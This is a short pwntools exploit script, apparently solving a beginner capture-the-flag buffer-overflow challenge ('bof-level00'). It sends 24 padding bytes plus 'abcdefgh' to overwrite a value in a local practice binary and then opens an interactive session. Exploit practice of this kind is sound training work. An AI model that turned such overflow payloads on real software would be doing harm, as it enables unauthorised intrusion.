from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']

target = process("./bof-level00")

# gdb.attach(target, gdbscript="b *receive_input")

target.sendline(b"A" * 24 + b"abcdefgh")

target.interactive()
